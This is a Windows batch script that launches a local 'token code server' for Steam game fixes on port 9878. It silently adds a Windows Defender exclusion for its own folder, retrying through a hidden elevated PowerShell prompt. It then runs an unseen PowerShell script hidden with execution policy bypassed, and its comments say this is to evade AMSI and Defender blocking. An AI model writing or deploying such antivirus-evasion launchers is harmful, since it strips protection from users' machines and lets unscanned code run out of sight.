@echo off
cd /d "%~dp0"
title Servidor de Codigos TOKEN - Fixes Steam

:: Check if already running
netstat -ano | findstr ":9878 " | findstr "LISTENING" >nul 2>&1
if not errorlevel 1 (
    echo code_server_token ya esta corriendo en puerto 9878
    start "" "http://127.0.0.1:9878/"
    pause
    exit /b
)

:: Defender exclusion for this folder (evita bloqueo AMSI)
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%~dp0' -Force" 2>nul
if %errorlevel% neq 0 (
    powershell -NoProfile -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -Command Add-MpPreference -ExclusionPath ''%~dp0'' -Force' " 2>nul
    timeout /t 3 /nobreak >nul
)

:: Start server (PS1 hidden, EXE blocked by Defender)
start "" /min powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0code_server_token.ps1"

echo Esperando servidor TCP en puerto 9878...
set /a tries=0
:wait
timeout /t 2 /nobreak >nul
netstat -ano | findstr ":9878" | findstr "LISTENING" >nul 2>&1
if errorlevel 1 (
  set /a tries+=1
  if %tries% lss 15 goto wait
  echo.
  echo ERROR: el servidor no inicio en 30s.
  echo Posible bloqueo de antivirus (AMSI) - exclusion agregada, reintenta.
  echo Log: %LOCALAPPDATA%\BastissSteam\server_start.log
  pause
  exit /b
)

echo.
echo ===========================================
echo  SERVIDOR TOKEN INICIADO
echo  Panel: http://127.0.0.1:9878/
echo  Tokens: maquina habilitada por token HMAC
echo  Cierra esta ventana para detener
echo ===========================================
echo.

start "" "http://127.0.0.1:9878/"

:hold
timeout /t 5 /nobreak >nul
netstat -ano | findstr ":9878 " | findstr "LISTENING" >nul 2>&1
if errorlevel 1 goto crashed
goto hold

:crashed
echo.
echo code_server_token se detuvo.
pause
